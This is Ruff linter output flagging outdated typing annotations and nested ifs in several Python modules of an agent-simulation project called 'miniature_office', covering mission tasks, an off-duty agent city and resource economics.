   --> src\app\miniature_office\core\maximum_autonomy.py:840:68
    |
838 |         }
839 |
840 |     def trigger_global_freeze(self, human_id: str, reason: str) -> Dict:
    |                                                                    ^^^^
841 |         """Trigger global freeze (emergency backstop)"""
842 |         self.global_freeze_active = True
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:852:37
    |
850 |         }
851 |
852 |     def get_absolute_stops(self) -> Set[str]:
    |                                     ^^^
853 |         """Get the 4 absolute stops"""
854 |         return self.absolute_stops.copy()
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:856:40
    |
854 |         return self.absolute_stops.copy()
855 |
856 |     def verify_free_operation(self) -> Dict:
    |                                        ^^^^
857 |         """Verify civilization operates freely with only 4 stops"""
858 |         return {
    |
help: Replace with `dict`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\app\miniature_office\core\mission.py:10:1
   |
 8 | from datetime import datetime, timezone
 9 | from enum import Enum
10 | from typing import Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\mission.py:10:1
   |
 8 | from datetime import datetime, timezone
 9 | from enum import Enum
10 | from typing import Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\mission.py:10:1
   |
 8 | from datetime import datetime, timezone
 9 | from enum import Enum
10 | from typing import Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\mission.py:41:16
   |
39 |     criteria_id: str = field(default_factory=lambda: str(uuid.uuid4()))
40 |     description: str = ""
41 |     validator: Optional[Callable[[], bool]] = None
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
42 |     is_met: bool = False
43 |     checked_at: Optional[datetime] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\mission.py:43:17
   |
41 |     validator: Optional[Callable[[], bool]] = None
42 |     is_met: bool = False
43 |     checked_at: Optional[datetime] = None
   |                 ^^^^^^^^^^^^^^^^^^
44 |
45 |     def check(self) -> bool:
   |
help: Convert to `X | None`

UP017 [*] Use `datetime.UTC` alias
  --> src\app\miniature_office\core\mission.py:49:40
   |
47 |         if self.validator:
48 |             self.is_met = self.validator()
49 |         self.checked_at = datetime.now(timezone.utc)
   |                                        ^^^^^^^^^^^^
50 |         return self.is_met
   |
help: Convert to `datetime.UTC` alias

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\mission.py:59:14
   |
57 |     condition_id: str = field(default_factory=lambda: str(uuid.uuid4()))
58 |     description: str = ""
59 |     checker: Optional[Callable[[], bool]] = None
   |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
60 |     is_satisfied: bool = False
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\mission.py:83:30
   |
81 |         level: DirectiveLevel,
82 |         description: str = "",
83 |         parent_directive_id: Optional[str] = None,
   |                              ^^^^^^^^^^^^^
84 |     ):
85 |         super().__init__(directive_id, EntityType.ARTIFACT, name)
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\mission.py:89:32
   |
87 |         self.description = description
88 |         self.parent_directive_id = parent_directive_id
89 |         self.child_directives: List[str] = []
   |                                ^^^^
90 |
91 |         # Directive formalism (Codex 2.1)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\mission.py:92:29
   |
91 |         # Directive formalism (Codex 2.1)
92 |         self.preconditions: List[Condition] = []
   |                             ^^^^
93 |         self.postconditions: List[Condition] = []
94 |         self.acceptance_criteria: List[AcceptanceCriteria] = []
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\mission.py:93:30
   |
91 |         # Directive formalism (Codex 2.1)
92 |         self.preconditions: List[Condition] = []
93 |         self.postconditions: List[Condition] = []
   |                              ^^^^
94 |         self.acceptance_criteria: List[AcceptanceCriteria] = []
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\mission.py:94:35
   |
92 |         self.preconditions: List[Condition] = []
93 |         self.postconditions: List[Condition] = []
94 |         self.acceptance_criteria: List[AcceptanceCriteria] = []
   |                                   ^^^^
95 |
96 |         # Log creation
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\mission.py:108:42
    |
107 |     def add_precondition(
108 |         self, description: str, checker: Optional[Callable] = None
    |                                          ^^^^^^^^^^^^^^^^^^
109 |     ) -> Condition:
110 |         """Add a precondition"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\mission.py:116:42
    |
115 |     def add_postcondition(
116 |         self, description: str, checker: Optional[Callable] = None
    |                                          ^^^^^^^^^^^^^^^^^^
117 |     ) -> Condition:
118 |         """Add a postcondition"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\mission.py:124:44
    |
123 |     def add_acceptance_criterion(
124 |         self, description: str, validator: Optional[Callable] = None
    |                                            ^^^^^^^^^^^^^^^^^^
125 |     ) -> AcceptanceCriteria:
126 |         """Add an acceptance criterion"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\mission.py:165:30
    |
163 |         name: str,
164 |         description: str = "",
165 |         parent_directive_id: Optional[str] = None,
    |                              ^^^^^^^^^^^^^
166 |         assigned_agent_id: Optional[str] = None,
167 |     ):
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\mission.py:166:28
    |
164 |         description: str = "",
165 |         parent_directive_id: Optional[str] = None,
166 |         assigned_agent_id: Optional[str] = None,
    |                            ^^^^^^^^^^^^^
167 |     ):
168 |         super().__init__(
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\mission.py:173:30
    |
171 |         self.state = TaskState.SCHEDULED
172 |         self.assigned_agent_id = assigned_agent_id
173 |         self.blocked_reason: Optional[str] = None
    |                              ^^^^^^^^^^^^^
174 |         self.state_history: List[Dict] = []
175 |         self.ambiguity_score: float = 0.0
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\mission.py:174:29
    |
172 |         self.assigned_agent_id = assigned_agent_id
173 |         self.blocked_reason: Optional[str] = None
174 |         self.state_history: List[Dict] = []
    |                             ^^^^
175 |         self.ambiguity_score: float = 0.0
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\mission.py:174:34
    |
172 |         self.assigned_agent_id = assigned_agent_id
173 |         self.blocked_reason: Optional[str] = None
174 |         self.state_history: List[Dict] = []
    |                                  ^^^^
175 |         self.ambiguity_score: float = 0.0
    |
help: Replace with `dict`

UP017 [*] Use `datetime.UTC` alias
   --> src\app\miniature_office\core\mission.py:188:39
    |
186 |             "to_state": new_state.value,
187 |             "reason": reason,
188 |             "timestamp": datetime.now(timezone.utc).isoformat(),
    |                                       ^^^^^^^^^^^^
189 |         }
190 |         self.state_history.append(change_record)
    |
help: Convert to `datetime.UTC` alias

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\core\mission.py:232:9
    |
231 |           # Special checks for certain states
232 | /         if new_state == TaskState.APPROVAL:
233 | |             if not self.check_postconditions():
    | |_______________________________________________^
234 |                   return False
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\core\mission.py:236:9
    |
234 |                   return False
235 |
236 | /         if new_state == TaskState.MERGED:
237 | |             if not self.is_ready_for_commit():
    | |______________________________________________^
238 |                   return False
    |
help: Combine `if` statements using `and`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\mission.py:275:19
    |
273 |     task_id: str = ""
274 |     meeting_date: datetime = field(default_factory=datetime.utcnow)
275 |     participants: List[str] = field(default_factory=list)  # Agent IDs
    |                   ^^^^
276 |     ambiguity_addressed: str = ""
277 |     decisions_made: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\mission.py:277:21
    |
275 |     participants: List[str] = field(default_factory=list)  # Agent IDs
276 |     ambiguity_addressed: str = ""
277 |     decisions_made: List[str] = field(default_factory=list)
    |                     ^^^^
278 |     action_items: List[str] = field(default_factory=list)
279 |     resolution: str = ""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\mission.py:278:19
    |
276 |     ambiguity_addressed: str = ""
277 |     decisions_made: List[str] = field(default_factory=list)
278 |     action_items: List[str] = field(default_factory=list)
    |                   ^^^^
279 |     resolution: str = ""
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\mission.py:281:26
    |
279 |     resolution: str = ""
280 |
281 |     def to_dict(self) -> Dict:
    |                          ^^^^
282 |         return {
283 |             "transcript_id": self.transcript_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\mission.py:300:27
    |
299 |     def __init__(self):
300 |         self.transcripts: Dict[str, DecisionTranscript] = {}
    |                           ^^^^
301 |
302 |     def hold_meeting(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\mission.py:305:23
    |
303 |         self,
304 |         task: Task,
305 |         participants: List[str],
    |                       ^^^^
306 |         ambiguity_addressed: str,
307 |         decisions_made: List[str],
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\mission.py:307:25
    |
305 |         participants: List[str],
306 |         ambiguity_addressed: str,
307 |         decisions_made: List[str],
    |                         ^^^^
308 |         resolution: str,
309 |     ) -> DecisionTranscript:
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\mission.py:340:53
    |
338 |         return transcript
339 |
340 |     def get_transcript(self, transcript_id: str) -> Optional[DecisionTranscript]:
    |                                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
341 |         """Retrieve a meeting transcript"""
342 |         return self.transcripts.get(transcript_id)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\mission.py:344:53
    |
342 |         return self.transcripts.get(transcript_id)
343 |
344 |     def get_task_transcripts(self, task_id: str) -> List[DecisionTranscript]:
    |                                                     ^^^^
345 |         """Get all transcripts for a task"""
346 |         return [t for t in self.transcripts.values() if t.task_id == task_id]
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\mission.py:358:37
    |
358 | def get_task_by_id(task_id: str) -> Optional[Task]:
    |                                     ^^^^^^^^^^^^^^
359 |     """Get a task by ID from the entity registry"""
360 |     from app.miniature_office.core.entity import get_registry
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\off_duty_city.py:27:1
   |
25 | from datetime import datetime
26 | from enum import Enum
27 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
28 |
29 | # ============================================================================
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\off_duty_city.py:27:1
   |
25 | from datetime import datetime
26 | from enum import Enum
27 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
28 |
29 | # ============================================================================
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\miniature_office\core\off_duty_city.py:27:1
   |
25 | from datetime import datetime
26 | from enum import Enum
27 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
28 |
29 | # ============================================================================
   |

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:114:25
    |
112 |     color: PixelColor  # Floor origin
113 |     accessory: PixelAccessory  # Role
114 |     reputation_markers: List[ReputationVisual] = field(default_factory=list)
    |                         ^^^^
115 |
116 |     def to_visual_description(self) -> str:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:158:24
    |
156 |     morale: float = 1.0  # 0.0 to 1.0
157 |     burnout_level: float = 0.0  # 0.0 to 1.0
158 |     recent_activities: List[Dict] = field(default_factory=list)
    |                        ^^^^
159 |     social_connections: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:158:29
    |
156 |     morale: float = 1.0  # 0.0 to 1.0
157 |     burnout_level: float = 0.0  # 0.0 to 1.0
158 |     recent_activities: List[Dict] = field(default_factory=list)
    |                             ^^^^
159 |     social_connections: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:159:25
    |
157 |     burnout_level: float = 0.0  # 0.0 to 1.0
158 |     recent_activities: List[Dict] = field(default_factory=list)
159 |     social_connections: List[str] = field(default_factory=list)
    |                         ^^^^
160 |
161 |     def update_state(self, new_state: AgentOffDutyState, activity: str):
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:200:16
    |
199 |     district_id: str
200 |     residents: Dict[str, AgentEmbodiment] = field(default_factory=dict)
    |                ^^^^
201 |
202 |     def add_resident(self, embodiment: AgentEmbodiment):
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:211:38
    |
209 |             del self.residents[embodiment_id]
210 |
211 |     def get_district_status(self) -> Dict:
    |                                      ^^^^
212 |         """Get district status summary"""
213 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:240:22
    |
239 |     workshop_id: str
240 |     active_projects: List[Dict] = field(default_factory=list)
    |                      ^^^^
241 |     visitors: List[str] = field(default_factory=list)  # embodiment_ids
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:240:27
    |
239 |     workshop_id: str
240 |     active_projects: List[Dict] = field(default_factory=list)
    |                           ^^^^
241 |     visitors: List[str] = field(default_factory=list)  # embodiment_ids
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:241:15
    |
239 |     workshop_id: str
240 |     active_projects: List[Dict] = field(default_factory=list)
241 |     visitors: List[str] = field(default_factory=list)  # embodiment_ids
    |               ^^^^
242 |
243 |     def start_project(self, embodiment_id: str, project_type: str, description: str):
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:273:27
    |
272 |     lounge_id: str
273 |     active_conversations: List[Dict] = field(default_factory=list)
    |                           ^^^^
274 |     cultural_artifacts: List[Dict] = field(default_factory=list)
275 |     participants: List[str] = field(default_factory=list)  # embodiment_ids
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:273:32
    |
272 |     lounge_id: str
273 |     active_conversations: List[Dict] = field(default_factory=list)
    |                                ^^^^
274 |     cultural_artifacts: List[Dict] = field(default_factory=list)
275 |     participants: List[str] = field(default_factory=list)  # embodiment_ids
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:274:25
    |
272 |     lounge_id: str
273 |     active_conversations: List[Dict] = field(default_factory=list)
274 |     cultural_artifacts: List[Dict] = field(default_factory=list)
    |                         ^^^^
275 |     participants: List[str] = field(default_factory=list)  # embodiment_ids
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:274:30
    |
272 |     lounge_id: str
273 |     active_conversations: List[Dict] = field(default_factory=list)
274 |     cultural_artifacts: List[Dict] = field(default_factory=list)
    |                              ^^^^
275 |     participants: List[str] = field(default_factory=list)  # embodiment_ids
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:275:19
    |
273 |     active_conversations: List[Dict] = field(default_factory=list)
274 |     cultural_artifacts: List[Dict] = field(default_factory=list)
275 |     participants: List[str] = field(default_factory=list)  # embodiment_ids
    |                   ^^^^
276 |
277 |     def start_conversation(self, participants: List[str], topics: List[str]):
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:277:48
    |
275 |     participants: List[str] = field(default_factory=list)  # embodiment_ids
276 |
277 |     def start_conversation(self, participants: List[str], topics: List[str]):
    |                                                ^^^^
278 |         """Start a lounge conversation"""
279 |         conversation_id = f"conv-{len(self.active_conversations)}"
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:277:67
    |
275 |     participants: List[str] = field(default_factory=list)  # embodiment_ids
276 |
277 |     def start_conversation(self, participants: List[str], topics: List[str]):
    |                                                                   ^^^^
278 |         """Start a lounge conversation"""
279 |         conversation_id = f"conv-{len(self.active_conversations)}"
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:314:14
    |
313 |     archives_id: str
314 |     records: List[Dict] = field(default_factory=list)
    |              ^^^^
315 |     visitors: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:314:19
    |
313 |     archives_id: str
314 |     records: List[Dict] = field(default_factory=list)
    |                   ^^^^
315 |     visitors: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:315:15
    |
313 |     archives_id: str
314 |     records: List[Dict] = field(default_factory=list)
315 |     visitors: List[str] = field(default_factory=list)
    |               ^^^^
316 |
317 |     def add_record(self, record_type: str, title: str, content: str, metadata: Dict):
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:317:80
    |
315 |     visitors: List[str] = field(default_factory=list)
316 |
317 |     def add_record(self, record_type: str, title: str, content: str, metadata: Dict):
    |                                                                                ^^^^
318 |         """Add historical record"""
319 |         self.records.append(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:351:17
    |
350 |     plaza_id: str
351 |     ceremonies: List[Dict] = field(default_factory=list)
    |                 ^^^^
352 |     attendees: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:351:22
    |
350 |     plaza_id: str
351 |     ceremonies: List[Dict] = field(default_factory=list)
    |                      ^^^^
352 |     attendees: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:352:16
    |
350 |     plaza_id: str
351 |     ceremonies: List[Dict] = field(default_factory=list)
352 |     attendees: List[str] = field(default_factory=list)
    |                ^^^^
353 |
354 |     def host_ceremony(self, ceremony_type: str, details: str, honorees: List[str]):
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:354:73
    |
352 |     attendees: List[str] = field(default_factory=list)
353 |
354 |     def host_ceremony(self, ceremony_type: str, details: str, honorees: List[str]):
    |                                                                         ^^^^
355 |         """Host a ceremony"""
356 |         self.ceremonies.append(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:380:23
    |
378 |     gate_id: str
379 |     gate_type: str  # "city_to_office", "city_to_sandbox", etc.
380 |     crossing_history: List[Dict] = field(default_factory=list)
    |                       ^^^^
381 |
382 |     def cross_gate(self, agent_id: str, from_zone: str, to_zone: str, crossing_by: str):
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:380:28
    |
378 |     gate_id: str
379 |     gate_type: str  # "city_to_office", "city_to_sandbox", etc.
380 |     crossing_history: List[Dict] = field(default_factory=list)
    |                            ^^^^
381 |
382 |     def cross_gate(self, agent_id: str, from_zone: str, to_zone: str, crossing_by: str):
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:413:20
    |
412 |     decay_id: str
413 |     decay_records: List[Dict] = field(default_factory=list)
    |                    ^^^^
414 |
415 |     def decay_reputation_visual(
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:413:25
    |
412 |     decay_id: str
413 |     decay_records: List[Dict] = field(default_factory=list)
    |                         ^^^^
414 |
415 |     def decay_reputation_visual(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:463:17
    |
462 |     firewall_id: str
463 |     violations: List[Dict] = field(default_factory=list)
    |                 ^^^^
464 |
465 |     def block_city_to_production_crossing(
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:463:22
    |
462 |     firewall_id: str
463 |     violations: List[Dict] = field(default_factory=list)
    |                      ^^^^
464 |
465 |     def block_city_to_production_crossing(
    |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:467:10
    |
465 |     def block_city_to_production_crossing(
466 |         self, crossing_type: str, source_agent: str, attempted_action: str
467 |     ) -> Tuple[bool, str]:
    |          ^^^^^
468 |         """
469 |         Block unauthorized city ΓåÆ production crossings
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:516:57
    |
514 |         )
515 |
516 |     def get_recent_violations(self, limit: int = 10) -> List[Dict]:
    |                                                         ^^^^
517 |         """Get recent firewall violations"""
518 |         return self.violations[-limit:]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:516:62
    |
514 |         )
515 |
516 |     def get_recent_violations(self, limit: int = 10) -> List[Dict]:
    |                                                              ^^^^
517 |         """Get recent firewall violations"""
518 |         return self.violations[-limit:]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:538:28
    |
537 |     manager_id: str
538 |     residential_districts: Dict[str, AgentEmbodiment] = field(default_factory=dict)
    |                            ^^^^
539 |     workshops: List[WorkshopStudio] = field(default_factory=list)
540 |     lounge: Optional[CityLounge] = None
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:539:16
    |
537 |     manager_id: str
538 |     residential_districts: Dict[str, AgentEmbodiment] = field(default_factory=dict)
539 |     workshops: List[WorkshopStudio] = field(default_factory=list)
    |                ^^^^
540 |     lounge: Optional[CityLounge] = None
541 |     archives: Optional[CityArchives] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\off_duty_city.py:540:13
    |
538 |     residential_districts: Dict[str, AgentEmbodiment] = field(default_factory=dict)
539 |     workshops: List[WorkshopStudio] = field(default_factory=list)
540 |     lounge: Optional[CityLounge] = None
    |             ^^^^^^^^^^^^^^^^^^^^
541 |     archives: Optional[CityArchives] = None
542 |     plaza: Optional[CityPlaza] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\off_duty_city.py:541:15
    |
539 |     workshops: List[WorkshopStudio] = field(default_factory=list)
540 |     lounge: Optional[CityLounge] = None
541 |     archives: Optional[CityArchives] = None
    |               ^^^^^^^^^^^^^^^^^^^^^^
542 |     plaza: Optional[CityPlaza] = None
543 |     transit_gates: List[TransitGate] = field(default_factory=list)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\off_duty_city.py:542:12
    |
540 |     lounge: Optional[CityLounge] = None
541 |     archives: Optional[CityArchives] = None
542 |     plaza: Optional[CityPlaza] = None
    |            ^^^^^^^^^^^^^^^^^^^
543 |     transit_gates: List[TransitGate] = field(default_factory=list)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:543:20
    |
541 |     archives: Optional[CityArchives] = None
542 |     plaza: Optional[CityPlaza] = None
543 |     transit_gates: List[TransitGate] = field(default_factory=list)
    |                    ^^^^
544 |
545 |     def initialize_zones(self):
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:582:17
    |
580 |     city_firewall: CityFirewall
581 |     visual_decay: VisualDecay
582 |     population: Dict[str, AgentEmbodiment] = field(default_factory=dict)
    |                 ^^^^
583 |
584 |     def add_agent_to_city(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:658:75
    |
656 |         return embodiment_id
657 |
658 |     def agent_visit_lounge(self, embodiment_id: str, conversation_topics: List[str]):
    |                                                                           ^^^^
659 |         """Agent visits city lounge for conversation"""
660 |         if embodiment_id in self.population:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:707:10
    |
705 |     def cross_transit_gate(
706 |         self, embodiment_id: str, destination: str, crossing_by: str, reason: str
707 |     ) -> Dict:
    |          ^^^^
708 |         """Agent crosses transit gate to different zone"""
709 |         if embodiment_id in self.population:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\off_duty_city.py:732:33
    |
730 |         return {"success": False}
731 |
732 |     def get_city_stats(self) -> Dict:
    |                                 ^^^^
733 |         """Get city statistics"""
734 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\scarcity_economics.py:12:1
   |
10 | from datetime import datetime
11 | from enum import Enum
12 | from typing import Dict, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
13 |
14 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\scarcity_economics.py:40:26
   |
38 |     simulation_budget: int = 0  # What-if simulations
39 |
40 |     def to_dict(self) -> Dict:
   |                          ^^^^
41 |         return {
42 |             "agent_time": self.agent_time,
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\scarcity_economics.py:119:26
    |
117 |         )
118 |
119 |     def to_dict(self) -> Dict:
    |                          ^^^^
120 |         return {
121 |             "entity_id": self.entity_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\scarcity_economics.py:202:26
    |
200 |     status: str = "pending"  # pending, accepted, rejected
201 |
202 |     def to_dict(self) -> Dict:
    |                          ^^^^
203 |         return {
204 |             "bid_id": self.bid_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\scarcity_economics.py:222:22
    |
221 |     def __init__(self):
222 |         self.ledger: Dict[str, Dict[int, ResourceLedgerEntry]] = (
    |                      ^^^^
223 |             {}
224 |         )  # entity_id -> tick -> entry
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\scarcity_economics.py:222:32
    |
221 |     def __init__(self):
222 |         self.ledger: Dict[str, Dict[int, ResourceLedgerEntry]] = (
    |                                ^^^^
223 |             {}
224 |         )  # entity_id -> tick -> entry
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\scarcity_economics.py:225:31
    |
223 |             {}
224 |         )  # entity_id -> tick -> entry
225 |         self.priority_market: Dict[str, PriorityBid] = {}
    |                               ^^^^
226 |
227 |     def allocate_resources(
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\scarcity_economics.py:323:10
    |
321 |     def get_ledger_entry(
322 |         self, entity_id: str, tick: int
323 |     ) -> Optional[ResourceLedgerEntry]:
